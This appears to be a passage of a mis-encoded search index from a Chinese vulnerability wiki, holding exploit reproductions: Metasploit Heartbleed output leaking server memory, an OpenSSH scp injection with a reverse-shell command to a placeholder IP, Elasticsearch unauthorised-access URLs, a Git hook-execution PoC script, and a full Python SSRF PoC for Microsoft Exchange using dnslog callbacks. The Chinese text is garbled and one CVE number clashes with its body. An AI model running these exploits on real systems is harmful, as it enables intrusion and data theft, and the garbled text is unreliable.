tries to dump key RESPONSE_TIMEOUT 10 yes Number of seconds to wait for a server response RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:' RPORT 443 yes The target port (TCP) STATUS_EVERY 5 yes How many retries until key dump status THREADS 1 yes The number of concurrent threads (max one per host) TLS_CALLBACK None yes Protocol to use, \"None\" to use raw TLS sockets (Accepted: None, SMTP, IMAP, JABBER, POP3, FTP, POSTGRES) TLS_VERSION 1.0 yes TLS/SSL version to use (Accepted: SSLv3, 1.0, 1.1, 1.2) Auxiliary action: Name Description ---- ----------- SCAN Check hosts for vulnerability msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set rhost 192.168.51.133 rhost => 192.168.51.133 msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set verbose true verbose => true msf5 auxiliary(scanner/ssl/openssl_heartbleed) > run [*] 192.168.51.133:443 - Leaking heartbeat response #1 [*] 192.168.51.133:443 - Sending Client Hello... [*] 192.168.51.133:443 - SSL record #1: [*] 192.168.51.133:443 - Type: 22 [*] 192.168.51.133:443 - Version: 0x0301 [*] 192.168.51.133:443 - Length: 86 [*] 192.168.51.133:443 - Handshake #1: [*] 192.168.51.133:443 - Length: 82 [*] 192.168.51.133:443 - Type: Server Hello (2) [*] 192.168.51.133:443 - Server Hello Version: 0x0301 [*] 192.168.51.133:443 - Server Hello random data: 5fd46996727a4e50c0e2eaecf52d1592384aaa6870d4d65eea8b6b34eb47a389 [*] 192.168.51.133:443 - Server Hello Session ID length: 32 [*] 192.168.51.133:443 - Server Hello Session ID: 66e9cacbefcb28955de31c38bd9dff93de153a6d6247fa117ebc3f2f091d6f74 [*] 192.168.51.133:443 - SSL record #2: [*] 192.168.51.133:443 - Type: 22 [*] 192.168.51.133:443 - Version: 0x0301 [*] 192.168.51.133:443 - Length: 822 [*] 192.168.51.133:443 - Handshake #1: [*] 192.168.51.133:443 - Length: 818 [*] 192.168.51.133:443 - Type: Certificate Data (11) [*] 192.168.51.133:443 - Certificates length: 815 [*] 192.168.51.133:443 - Data length: 818 [*] 192.168.51.133:443 - Certificate #1: [*] 192.168.51.133:443 - Certificate #1: Length: 812 [*] 192.168.51.133:443 - Certificate #1: #, issuer=#, serial=#, not_before=2020-08-09 17:03:46 UTC, not_after=2021-08-09 17:03:46 UTC> [*] 192.168.51.133:443 - SSL record #3: [*] 192.168.51.133:443 - Type: 22 [*] 192.168.51.133:443 - Version: 0x0301 [*] 192.168.51.133:443 - Length: 331 [*] 192.168.51.133:443 - Handshake #1: [*] 192.168.51.133:443 - Length: 327 [*] 192.168.51.133:443 - Type: Server Key Exchange (12) [*] 192.168.51.133:443 - SSL record #4: [*] 192.168.51.133:443 - Type: 22 [*] 192.168.51.133:443 - Version: 0x0301 [*] 192.168.51.133:443 - Length: 4 [*] 192.168.51.133:443 - Handshake #1: [*] 192.168.51.133:443 - Length: 0 [*] 192.168.51.133:443 - Type: Server Hello Done (14) [*] 192.168.51.133:443 - Sending Heartbeat... [*] 192.168.51.133:443 - Heartbeat response, 65535 bytes [+] 192.168.51.133:443 - Heartbeat response with leak, 65535 bytes [*] 192.168.51.133:443 - Printable info leaked: ......_...DV.\\....G...{.vc..i ..Gv.'....f.....\".!.9.8.........5.............................3.2.....E.D...../...A.......................................w.....#.'.g.@.r.v.........8.........2.....E.D.......Q.......P.=...ServiceInstanceW&V.b...?....|.y..................................................................................................................................... repeated 15479 times .....................................................................................................................................@..................................................................................................................................... repeated 16122 times .....................................................................................................................................@.................................................................................................................................................................................................................................................................................................................................QA......h.......h.........7.RV....7.RV..................................................................................................................................... repeated 4129 times .....................................................................................................................................0......X.......X.........................7.RV..............................RV..=.c.RV.. .7.RV..x.7.RV....7.RV....7.RV..x.7.RV..x.7.RV..h.7.RV....7.RV....7.RV..192.168.51.146 - - [12/Dec/2020:06:47:40 +0000] \"POST /sdk HTTP/1.1\" 404 170 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\".org/book/nse.html)\"..................................................................................................................................... repeated 3184 times .....................................................................................................................................Q ........................7.RV....7.RV..................................................................................................................................... repeated 7539 times .....................................................................................................................................@..........................................................................................................................................................................................................................................................................................................................................@.......................................................................................................................................................................................................$4.RV..................................@....... .......0.8.RV..........`.......0........$4.RV..jfx...&...~.RV..........PA......`....... '..RV..@d4.RV....................2.RV....................2.RV..........................1.................8.RV..........................1...............................................!...............h....... ...............m..U`.W.....O.>c.....E^X4........kr[..:.1...z[..x.W].........f...3h.qS.&K.(A*q*...].tx.b....X........Np....l.F...5....~..Z2.D..$........................................................................................................................................1.......x.......x.......P.2.RV....2.RV..0.......0.......>#NQ[.8.].......&.i2y.x.I....iOk........a....... '..RV..`.2.RV..................0.2.RV....................2.RV......................;P.e.........................U.6.&`.Ks..w>V.. ^..N..z....z...M.+..n/i..C...D......a..2.p.....I5.F......!.3Xhy.4.....r.....h.d..b........).......3.....&......IE...c,8.T.~..H.P.{y.....CK.,!&..;..vw....H.C...q....%e..{.XT.jq.R.r.....RHw..57.COlB..|......@...*.G(3..-N..P....mLO..]./.,9..|..+2.Lh..q..dF.m...'.....`...S.8........Q...U.0....I................................................................................................................................................................................................................................................................................ '..RV.. .8.RV..`.2.RV....................8.RV.................................. .2.RV....................2.RV............................................2.RV....................2.RV.......................... .2.RV.. .2.RV..................h.......h.........8.RV....8.RV..................................................................................................................................... repeated 745 times .....................................................................................................................................#8.RV..`.2.RV........!.3Xhy.4.....r.....h.d..b........).......3.....&......IE...c,8.T.~..H.P.{y.....CK.,!&..;..vw....H.C...q....%e..{.XT.jq.R.r.....RHw..57.COlB..|......@...*.G(3..-N..P....mLO..]./.,9..|..+2.Lh..q..dF.m...'.....`...S.8........Q...U.0....I ..................................................................................................................................... repeated 277 times .....................................................................................................................................X.......`.2.RV..........................................................P...........RV............................................................................................................................................................................................................................................................................................................................................2.RV..X..................................................................................................................................... repeated 437 times .....................................................................................................................................A.......X.........1.RV..................................................................................................................................................................................................................................................................................................................................X.......X..................................................................................................................................... repeated 429 times .....................................................................................................................................x.......!.......X.......X..................................................................................................................................... repeated 1942 times .....................................................................................................................................@..........V...R.._.i.rzNP.....-..8J.hp..^..k4.G.. f.....(.]..8......:mbG..~.?/..ot...................6...2../..,0..(0...........j..0...*.H........0V1.0...U....US1.0...U....Denial1.0...U....Springfield1.0...U....Dis1.0...U....localhost0...200809170346Z..210809170346Z0V1.0...U....US1.0...U....Denial1.0...U....Springfield1.0...U....Dis1.0...U....localhost0..\"0...*.H.............0.........8...;....../t.....^.....P..=....w.*b.a>.8.Q.?.$.c.......{G. ........l..i...D..V....0......B..J..Y.c.wO.....M.Df..R....\".4.u...............P.>.c..|.s(......,..H.1..0.=l`...(2..Sb.......`...c....5J....v..uj.*^i.$6^..a3.s.......v...\\....M.pK.9....t.&...|y...u1.......u..M..%.+..{e....G..~.v.D.6...............=).3{......r/.\"vz..a.U..5-.5.=......l..ud......Nx...n..$h...4.G.~b.LU.Y...37..e....%.w.......K...G...A....~m.h,......qz>}uA.^)..A.&}o@..'...y.]..V..S..JY........Y/.u|....$.n.T._.b\\\\c...o.]....L.h...v*....z..D..?Kq9hJ.kT....?.....=......su....p.S...j.e.....-N}.S...x..Z.....t.;Z...n=.1.......J.1n.l...w. .l.d.W. .........8..`.>O........t...r..~.A$..R...v.8......x.\\o Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/OpenSSH/":{"url":"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/OpenSSH/","title":"OpenSSH","keywords":"","body":"OpenSSH OpenSSH ÂëΩ‰ª§Ê≥®ÂÖ•ÊºèÊ¥û CVE-2020-15778 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/OpenSSH/OpenSSH ÂëΩ‰ª§Ê≥®ÂÖ•ÊºèÊ¥û CVE-2020-15778.html":{"url":"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/OpenSSH/OpenSSH ÂëΩ‰ª§Ê≥®ÂÖ•ÊºèÊ¥û CVE-2020-15778.html","title":"OpenSSH ÂëΩ‰ª§Ê≥®ÂÖ•ÊºèÊ¥û CVE-2020-15778","keywords":"","body":"OpenSSH ÂëΩ‰ª§Ê≥®ÂÖ•ÊºèÊ¥û CVE-2020-15778 ÊºèÊ¥ûÊèèËø∞ 2020Âπ¥6Êúà9Êó•ÔºåÁ†îÁ©∂‰∫∫ÂëòChinmay PandyaÂú®Openssh‰∏≠ÂèëÁé∞‰∫Ü‰∏Ä‰∏™ÊºèÊ¥ûÔºå‰∫é7Êúà18Êó•ÂÖ¨ÂºÄ„ÄÇOpenSSHÁöÑ8.3p1‰∏≠ÁöÑscpÂÖÅËÆ∏Âú®scp.cËøúÁ®ãÂäüËÉΩ‰∏≠Ê≥®ÂÖ•ÂëΩ‰ª§ÔºåÊîªÂáªËÄÖÂèØÂà©Áî®ËØ•ÊºèÊ¥ûÊâßË°å‰ªªÊÑèÂëΩ‰ª§„ÄÇÁõÆÂâçÁªùÂ§ßÂ§öÊï∞linuxÁ≥ªÁªüÂèóÂΩ±Âìç„ÄÇÊ∑±‰ø°ÊúçÂÆâÂÖ®Á†îÁ©∂Âõ¢Èòü‰æùÊçÆÊºèÊ¥ûÈáçË¶ÅÊÄßÂíåÂΩ±ÂìçÂäõËøõË°åËØÑ‰º∞Ôºå‰ΩúÂá∫ÊºèÊ¥ûÈÄöÂëä„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] OpenSSH ÊºèÊ¥ûÂ§çÁé∞ [!NOTE] ÂèØÁî®‰∫éÁõÆÊ†á‰∏çÂÖÅËÆ∏ËøúÁ®ãÁôªÂΩï‰ΩÜSCPÂºÄÂêØÁöÑÊÉÖÂÜµ‰∏ãËøúÁ®ãÂëΩ‰ª§ÊâßË°å ÊîªÂáªÊú∫ÂàõÂª∫ peiqi.txt ÔºåÂà©Áî® scp‰∏ä‰º†Êñá‰ª∂ Âà∞ /tmp ÁõÆÂΩï‰∏ã ÊâßË°åÂëΩ‰ª§ ping dnslog ÂèçÂºπshell Êõ¥Êç¢ÂëΩ‰ª§Âç≥ÂèØ /bin/bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/Elasticsearch/":{"url":"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/Elasticsearch/","title":"Elasticsearch","keywords":"","body":"Elasticsearch Elasticsearch Êú™ÊéàÊùÉËÆøÈóÆ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/Elasticsearch/Elasticsearch Êú™ÊéàÊùÉËÆøÈóÆ.html":{"url":"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/Elasticsearch/Elasticsearch Êú™ÊéàÊùÉËÆøÈóÆ.html","title":"Elasticsearch Êú™ÊéàÊùÉËÆøÈóÆ","keywords":"","body":"Elasticsearch Êú™ÊéàÊùÉËÆøÈóÆ ÊºèÊ¥ûÊèèËø∞ ElasticsearchÊòØÁî®JavaÂºÄÂèëÁöÑ‰ºÅ‰∏öÁ∫ßÊêúÁ¥¢ÂºïÊìéÔºåÈªòËÆ§Á´ØÂè£9200ÔºåÂ≠òÂú®Êú™ÊéàÊùÉËÆøÈóÆÊºèÊ¥ûÊó∂ÔºåÂèØË¢´ÈùûÊ≥ïÊìç‰ΩúÊï∞ÊçÆ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Elasticsearch ÊºèÊ¥ûÂ§çÁé∞ ËÆøÈóÆÁõÆÊ†áURL : http://xxx.xxx.xxx.xxx:9200/_node http://localhost:9200/_cat/indices http://localhost:9200/_river/_search //Êü•ÁúãÊï∞ÊçÆÂ∫ìÊïèÊÑü‰ø°ÊÅØ http://localhost:9200/_nodes //Êü•ÁúãËäÇÁÇπÊï∞ÊçÆ http://localhost:9200/_plugin/head/ //webÁÆ°ÁêÜÁïåÈù¢(headÊèí‰ª∂) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/Git/":{"url":"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/Git/","title":"Git","keywords":"","body":"Git Git for Visual StudioËøúÁ®ãÊâßË°å‰ª£Á†ÅÊºèÊ¥û CVE-2021-21300 Git-LFS ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2020-27955 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/Git/Git for Visual StudioËøúÁ®ãÊâßË°å‰ª£Á†ÅÊºèÊ¥û CVE-2021-21300.html":{"url":"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/Git/Git for Visual StudioËøúÁ®ãÊâßË°å‰ª£Á†ÅÊºèÊ¥û CVE-2021-21300.html","title":"Git for Visual StudioËøúÁ®ãÊâßË°å‰ª£Á†ÅÊºèÊ¥û CVE-2021-21300","keywords":"","body":"Git for Visual StudioËøúÁ®ãÊâßË°å‰ª£Á†ÅÊºèÊ¥û CVE-2021-21300 ÊºèÊ¥ûÊèèËø∞ Ê≠§ÊºèÊ¥ûÂΩ±ÂìçÂÖ∑Êúâ‰∏çÂå∫ÂàÜÂ§ßÂ∞èÂÜôÁöÑÊñá‰ª∂Á≥ªÁªüÁöÑÂπ≥Âè∞ÔºåÂΩìÊüê‰∫õËøáÊª§Âô®Ë¢´‰ΩøÁî®Êó∂Ôºà‰æãÂ¶ÇGit LFSÔºâ„ÄÇGitÂèØËÉΩ‰ºöË¢´Ê¨∫È™óËøêË°åÂÖãÈöÜÊúüÈó¥ÁöÑËøúÁ®ã‰ª£Á†Å„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] v2.17.6Ôºåv2.18.5Ôºåv2.19.6Ôºåv2.20.5Ôºåv2.21.4Ôºå v2.22.5Ôºåv2.23.4Ôºåv2.24.4Ôºåv2.25.5Ôºåv2.26.3Ôºåv2.27.1Ôºåv2.28.1Ôºåv2.29.3Ôºå v2.30.2„ÄÇ ÊºèÊ¥ûÂ§çÁé∞ ÊöÇÊó†Â§çÁé∞ ÂèÇËÄÉÊñáÁ´†: https://www.openwall.com/lists/oss-security/2021/03/09/3 ÊºèÊ¥ûÂà©Áî®POC #!/bin/sh git init delayed-checkout && ( cd delayed-checkout && echo \"A/post-checkout filter=lfs diff=lfs merge=lfs\" \\ >.gitattributes && mkdir A && printf '#!/bin/sh\\n\\necho PWNED >&2\\n' >A/post-checkout && chmod +x A/post-checkout && >A/a && >A/b && git add -A && rm -rf A && ln -s .git/hooks a && git add a && git commit -m initial ) && git clone delayed-checkout cloned Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/Git/Git-LFS ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2020-27955.html":{"url":"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/Git/Git-LFS ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2020-27955.html","title":"Git-LFS ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2020-27955","keywords":"","body":"Git-LFS ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2020-27955 ÊºèÊ¥ûÊèèËø∞ Git LFS ÊòØ Github ÂºÄÂèëÁöÑ‰∏Ä‰∏™ Git ÁöÑÊâ©Â±ïÔºåÁî®‰∫éÂÆûÁé∞ Git ÂØπÂ§ßÊñá‰ª∂ÁöÑÊîØÊåÅ ‰∏Ä‰∫õÂèóÂΩ±ÂìçÁöÑ‰∫ßÂìÅÂåÖÊã¨GitÔºåGitHub CLIÔºåGitHub DesktopÔºåVisual StudioÔºåGitKradenÔºåSmartGitÔºåSourcetreeÁ≠â ËØ•ÊºèÊ¥ûÂΩ±Âìç‰ªÖwindowsÂπ≥Âè∞ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Git-LFSÔºàgit-lfsÔºâ ÊºèÊ¥ûÂ§çÁé∞ ËøêË°å‰∏ãÂàóÁöÑÂëΩ‰ª§ÔºåÂ¶ÇÊûúÁâàÊú¨Âú®ÂΩ±ÂìçËåÉÂõ¥Âàô‰ºöÂºπÂá∫ËÆ°ÁÆóÂô® git clone https://github.com/r00t4dm/CVE-2020-27955 ÊºèÊ¥ûPOC https://github.com/r00t4dm/CVE-2020-27955 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/Microsoft Exchange/":{"url":"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/Microsoft Exchange/","title":"Microsoft Exchange","keywords":"","body":"Microsoft Exchange Microsoft Exchange SSRFÊºèÊ¥û CVE-2021-26885 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/Microsoft Exchange/Microsoft Exchange SSRFÊºèÊ¥û CVE-2021-26885.html":{"url":"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/Microsoft Exchange/Microsoft Exchange SSRFÊºèÊ¥û CVE-2021-26885.html","title":"Microsoft Exchange SSRFÊºèÊ¥û CVE-2021-26885","keywords":"","body":"Microsoft Exchange SSRFÊºèÊ¥û CVE-2021-26885 ÊºèÊ¥ûÊèèËø∞ Exchange Server ÊòØÂæÆËΩØÂÖ¨Âè∏ÁöÑ‰∏ÄÂ•óÁîµÂ≠êÈÇÆ‰ª∂ÊúçÂä°ÁªÑ‰ª∂ÔºåÊòØ‰∏™Ê∂àÊÅØ‰∏éÂçè‰ΩúÁ≥ªÁªü„ÄÇ2021Âπ¥03Êúà3Êó•ÔºåÂæÆËΩØÂÆòÊñπÂèëÂ∏É‰∫ÜMicrosoft ExchangeÂÆâÂÖ®Êõ¥Êñ∞ÔºåÊä´Èú≤‰∫ÜÂ§ö‰∏™È´òÂç±‰∏•ÈáçÊºèÊ¥ûÔºåÂÖ∂‰∏≠ÔºöÂú® CVE-2021-26855 Exchange SSRFÊºèÊ¥û‰∏≠ÔºåÊîªÂáªËÄÖÂèØÁõ¥Êé•ÊûÑÈÄ†ÊÅ∂ÊÑèËØ∑Ê±ÇÔºå‰ª•Exchange serverÁöÑË∫´‰ªΩÂèëËµ∑‰ªªÊÑèHTTPËØ∑Ê±ÇÔºåÊâ´ÊèèÂÜÖÁΩëÔºåÂπ∂‰∏îÂèØËé∑ÂèñExchangeÁî®Êà∑‰ø°ÊÅØ„ÄÇËØ•ÊºèÊ¥ûÂà©Áî®Êó†ÈúÄË∫´‰ªΩËÆ§ËØÅ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Exchange 2013 Versions Exchange 2016 CU18 Exchange 2016 CU19 Exchange 2019 CU7 Exchange 2019 CU8 FOFA [!NOTE] icon_hash=\"1768726119\" ÊºèÊ¥ûÂ§çÁé∞ ‰∏é SSRF ÊúâÂÖ≥ÁöÑÊñá‰ª∂ /owa/auth/Current/themes/resources/logon.css /owa/auth/Current/themes/resources/... /ecp/default.flt /ecp/main.css /ecp/.js Êü•ÁúãË°•‰∏Å‰∏≠ÁöÑÊîπÂèòÔºåÂèØ‰ª•ÁúãÂà∞ÊúâÂÖ≥ BackEndServer ‰ΩøÁî®ÁöÑÁ±ªÂÖ≥‰∫é BEResourceRequestHandler ÁöÑÊîπÂèò ‰øÆÂ§ç BEResourceRequestHandler ‰ΩøÁî®ÁöÑ BakcEndServerÁ±ªÁöÑË°•‰∏Å Êü•ÁúãË∞ÉÁî®BERsourceRequestHandler ÁöÑÊñπÊ≥ï SelectHandlerForUnauthenticatedRequest Êü•ÊâæÁõ∏ÂÖ≥Ë∑ØÂæÑ ProxyMoudle ÂèØ‰ª•‰ªé‰∏≠ÁúãÂà∞ÈúÄË¶ÅÂ∏¶Êúâ EXPÂçèËÆÆ(‰æãÂ¶ÇË∑ØÂæÑ /ecp/), CookieÂèÇÊï∞ X-BEResponse, ËøòÊúâ‰ª•ÈùôÊÄÅÊâ©Â±ïÂêçÁªìÂ∞æÁöÑ URL (‰æãÂ¶Ç x.js, x.cssÁ≠â) ËÄåÂÖ∂‰∏≠ÁöÑËØ∑Ê±Ç‰∏∫ HttpProxy Êù•ÂÆûÁé∞ÁöÑÔºåÊâÄ‰ª•Â§ßÈÉ®ÂàÜÁöÑPOC‰∏≠ËØ∑Ê±ÇÁöÑÊñá‰ª∂‰∏∫/etc/y.js ËøôÊ†∑Á±ª‰ºº‰∏çÂ≠òÂú®ÁöÑÊñá‰ª∂ ÂèÇÊï∞ X-BEResource Ëß£ÊûêÂú® BackEndServer.FromString Ë∑üË∏™ BackEndServerÂØπË±°Ôºå ÂÖ∂‰∏≠ËØ•ÂØπË±°‰ΩøÁî® ProxyRequestHandler Âêë‰∏ªÊú∫ÂèëÈÄÅËØ∑Ê±Ç ËøôÈáåËøõË°åSSRFÁöÑÊºèÊ¥ûÂ§çÁé∞ÔºåÈ¶ñÂÖàËÆøÈóÆ /ecp/PeiQi.js Êñá‰ª∂ Âπ∂ËÆæÁΩÆCookie X-BEResource=peiqi_wiki/api/endpoint#~1; X-AnonResource=true GET /ecp/PeiQi.js HTTP/1.1 Host: xxx.xxx.com Connection: close sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36 Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: no-cors Sec-Fetch-Dest: image Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: X-BEResource=peiqi_wiki/api/endpoint#~1; X-AnonResource=true Áî®ËøôÊ†∑ÁöÑÊñπÂºèËØ∑Ê±ÇÂèØ‰ª•Á°ÆÂÆöÊòØÂê¶Â≠òÂú® SSRFÊºèÊ¥û ÂìçÂ∫îÂåÖ‰∏∫: NegotiateSecurityContext failed with for host 'peiqi_wiki' with status 'TargetUnknown' ÊòæÁ§∫ËøôÊ†∑ÁöÑÂ∞±ÊòØÂèØËÉΩÂ≠òÂú®‰∫Ü Âú®ÈÄöËøáÂèëÈÄÅ‰∏Ä‰∏™ËØ∑Ê±ÇÁªô DnslogÁ°ÆËÆ§ÊòØÂê¶Â≠òÂú® SSRFÁªô DnslogÂèëÈÄÅ‰∫Ü‰∏Ä‰∏™ËØ∑Ê±Ç GET /owa/auth/PeiQi.js HTTP/1.1 Host: xxx.xxx.com Connection: close sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36 Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: no-cors Sec-Fetch-Dest: image Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: X-AnonResource=true; X-AnonResource-Backend=ianqsx.dnslog.cn/ecp/default.flt?~3; X-BEResource=ianqsx.dnslog.cn/owa/auth/logon.aspx?~3; [!NOTE] Cookie: X-AnonResource=true; X-AnonResource-Backend=ianqsx.dnslog.cn/ecp/default.flt?~3; X-BEResource=ianqsx.dnslog.cn/owa/auth/logon.aspx?~3; Â∞ÜÂÖ∂‰∏≠ÁöÑ DnslogÊç¢ÊàêËá™Â∑±ÁöÑ Á°ÆÂÆöÊî∂Âà∞‰∫ÜÁî±ÊúçÂä°Á´ØÂèëÈÄÅÁöÑËØ∑Ê±ÇÔºåÂ≠òÂú®SSRFÊºèÊ¥û ÊºèÊ¥ûÂà©Áî®POC import requests import sys import random import re import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: Microsoft ExchangeÂ§ö‰∏™ÁâàÊú¨ \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> mail.xxx.xxx.xxx \\033[0m') print('+ \\033[36mDnslog >>> xxxx.dnslog.cn \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = \"https://\" + target_url + \"/ecp/PeiQi.js\" headers = { 'Cookie': 'X-BEResource=peiqi_wiki/api/endpoint#~1; X-AnonResource=true' } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if response.status_code == 500 and 'NegotiateSecurityContext' in response.text and 'peiqi_wiki' in response.text: print(\"\\033[32m[o] ÁõÆÊ†á {} Â≠òÂú®SSRFÊºèÊ¥ûÔºå ËæìÂÖ•DnslogÂú∞ÂùÄËøõ‰∏ÄÊ≠•Ê£ÄÊµã....\\033[0m\".format(target_url)) dnslog = str(input(\"\\033[35mDnslog >>> \\033[0m\")) POC_2(target_url, dnslog) else: print(\"\\033[31m[x] ÁõÆÊ†á {} ‰∏çÂ≠òÂú®SSRFÊºèÊ¥û \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) def POC_2(target_url, dnslog): vuln_url = \"https://\" + target_url + \"/owa/auth/PeiQi.js\" headers = { 'Cookie': 'X-AnonResource=true; X-AnonResource-Backend={}/ecp/default.flt?~3; X-BEResource={}/owa/auth/logon.aspx?~3;'.format(dnslog, dnslog) } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] ËØ∑Êü•Áúã DnslogÔºö{} ÂìçÂ∫î....\\033[0m\".format(dnslog)) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] Microsoft Exchange SSRFÊºèÊ¥û CVE-2021-26885 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/Microsoft Exchange/Microsoft Exchange ËøúÁ®ãÂëΩ‰ª§ÊâßË°å CVE-2021-27065 26857 26858 27065.html":{"url":"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/Microsoft Exchange/Microsoft Exchange ËøúÁ®ãÂëΩ‰ª§ÊâßË°å CVE-2021-27065 26857 26858 27065.html","title":"Microsoft Exchange ËøúÁ®ãÂëΩ‰ª§ÊâßË°å CVE-2021-27065 26857 26858 27065","keywords":"","body":"Microsoft Exchange ËøúÁ®ãÂëΩ‰ª§ÊâßË°å CVE-2021-26855/26857/26858/27065 ÊºèÊ¥ûÊèèËø∞ Microsoft Exchange Server ÊòØ‰∏™Ê∂àÊÅØ‰∏éÂçè‰ΩúÁ≥ªÁªü„ÄÇExchange 